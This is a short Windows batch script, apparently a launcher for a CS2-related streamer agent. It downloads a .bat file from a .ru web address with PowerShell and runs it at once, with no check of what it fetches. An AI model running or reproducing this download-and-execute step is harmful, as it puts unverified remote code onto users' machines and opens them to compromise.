@echo off
if not exist test_run mkdir test_run
cd test_run
powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri https://paracetamolhaze.ru/api/cs2/agent/download-bat?streamerId=test -OutFile run-cs2-agent.bat -UseBasicParsing"
call run-cs2-agent.bat
